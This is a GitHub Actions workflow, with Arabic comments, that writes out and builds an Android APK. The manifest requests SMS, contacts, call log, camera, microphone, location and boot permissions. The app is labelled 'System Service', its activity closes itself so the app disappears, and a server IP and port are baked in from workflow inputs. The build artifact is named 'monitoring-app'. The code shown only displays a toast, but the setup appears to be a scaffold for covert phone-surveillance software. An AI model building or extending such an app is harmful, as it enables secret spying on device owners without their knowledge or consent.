name: Build APK

on:
  workflow_dispatch:
    inputs:
      server_ip:
        description: 'Server IP Address'
        required: true
        default: '192.168.0.173'
      server_port:
        description: 'Server Port'
        required: true
        default: '8080'

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      - name: Create Android app with all permissions
        run: |
          # إنشاء المجلدات
          mkdir -p app/src/main/java/com/example/app
          mkdir -p app/src/main/res/drawable
          mkdir -p app/src/main/res/values
          
          # AndroidManifest.xml (كل الصلاحيات)
          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.example.app">
              
              <!-- كل الصلاحيات الممكنة -->
              <uses-permission android:name="android.permission.INTERNET"/>
              <uses-permission android:name="android.permission.CAMERA"/>
              <uses-permission android:name="android.permission.RECORD_AUDIO"/>
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
              <uses-permission android:name="android.permission.READ_SMS"/>
              <uses-permission android:name="android.permission.RECEIVE_SMS"/>
              <uses-permission android:name="android.permission.READ_CONTACTS"/>
              <uses-permission android:name="android.permission.READ_CALL_LOG"/>
              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
              <uses-permission android:name="android.permission.WAKE_LOCK"/>
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
              
              <application
                  android:label="System Service"
                  android:icon="@drawable/ic_launcher">
                  <activity android:name=".MainActivity">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
              </application>
          </manifest>
          EOF
          
          # أيقونة بسيطة
          cat > app/src/main/res/drawable/ic_launcher.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android"
              android:shape="oval">
              <solid android:color="#3F51B5" />
              <size android:width="48dp" android:height="48dp" />
          </shape>
          EOF
          
          # MainActivity.java
          cat > app/src/main/java/com/example/app/MainActivity.java << 'EOF'
          package com.example.app;
          import android.app.Activity;
          import android.os.Bundle;
          import android.widget.Toast;
          public class MainActivity extends Activity {
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  String serverIP = "${{ github.event.inputs.server_ip }}";
                  String serverPort = "${{ github.event.inputs.server_port }}";
                  Toast.makeText(this, "Service active on " + serverIP + ":" + serverPort, Toast.LENGTH_LONG).show();
                  
                  // إنهاء النشاط عشان يختفي
                  finish();
              }
          }
          EOF

      - name: Build APK without Gradle
        run: |
          # 🔥 الطريقة المضمونة بدون Gradle 🔥
          
          # 1. تجميع ملفات جافا
          mkdir -p bin
          ANDROID_JAR="$ANDROID_SDK_ROOT/platforms/android-30/android.jar"
          javac -cp "$ANDROID_JAR" -d bin app/src/main/java/com/example/app/*.java
          
          # 2. تحويل classes إلى dex
          mkdir -p build
          $ANDROID_SDK_ROOT/build-tools/30.0.3/dx --dex --output=build/classes.dex bin
          
          # 3. تجميع الموارد
          mkdir -p build/apk
          $ANDROID_SDK_ROOT/build-tools/30.0.3/aapt package -f \
            -M app/src/main/AndroidManifest.xml \
            -S app/src/main/res \
            -I $ANDROID_SDK_ROOT/platforms/android-30/android.jar \
            -F build/apk/app-unsigned.apk \
            build/classes.dex
          
          # 4. نقل الملف النهائي
          cd build/apk
          mv app-unsigned.apk ../../app-debug.apk
          
          # 5. عرض الملفات
          cd ../..
          ls -la app-debug.apk

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: monitoring-app
          path: app-debug.apk
